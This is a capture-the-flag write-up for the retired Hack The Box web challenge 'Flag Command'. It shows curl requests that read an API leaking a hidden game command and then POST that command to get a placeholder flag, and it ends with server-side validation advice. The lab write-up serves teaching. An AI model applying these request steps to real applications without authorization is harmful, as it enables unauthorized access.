---
challenge: Flag Command
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, api, javascript, information-disclosure, client-side]
---

# Flag Command — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

"Dimensional Escape Quest": a terminal that looks like an adventure game, but all the logic is client-side. The three JS files (`commands.js`, `main.js`, `game.js`) show an `availableOptions['secret']` list, and the `GET /api/options` API returns the full JSON including the secret command. Submit it and the flag comes back.

## Brief

A browser terminal accepting commands (`start`, `help`, `clear`…). The game always ends in defeat: no combination of normal options wins.

## Analysis

Check the traffic and the code:

```bash
curl -s http://<IP>:<port>/ | grep -o 'src="[^"]*"'
```

```text
/static/terminal/js/commands.js
/static/terminal/js/main.js
/static/terminal/js/game.js
```

`main.js` holds the key check:

```js
if (availableOptions[currentStep].includes(currentCommand) ||
    availableOptions['secret'].includes(currentCommand)) {
```

That `availableOptions['secret']` is only populated from the API response:

```bash
curl -s http://<IP>:<port>/api/options
```

```json
{"commands": ["start","help","clear", {"secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]}]}
```

## Exploitation

Send the secret command, which the server accepts as valid at the monitor endpoint:

```bash
curl -s -X POST http://<IP>:<port>/api/monitor \
  -H 'Content-Type: application/json' \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

```text
HTB{<flag>}
```

The flag also shows in the `monitor` request response in the network tab, which is where it can be copied.

## Pitfalls

- **Exact phrase**: it must match the JSON punctuation and capitalisation.
- **CORS**: if the POST fails from outside the browser, run it from the site's own console.
- **JS filenames**: they differ between deployments; grep every file for `api/options`.

## Lessons

- A "client" game that decides which commands are valid is not a game: it is readable logic.
- Lists of "hidden" options in an API are undocumented functionality, not a secret.
- Mitigation: validate server-side against a per-state allowlist and stop shipping unnecessary metadata to the client.
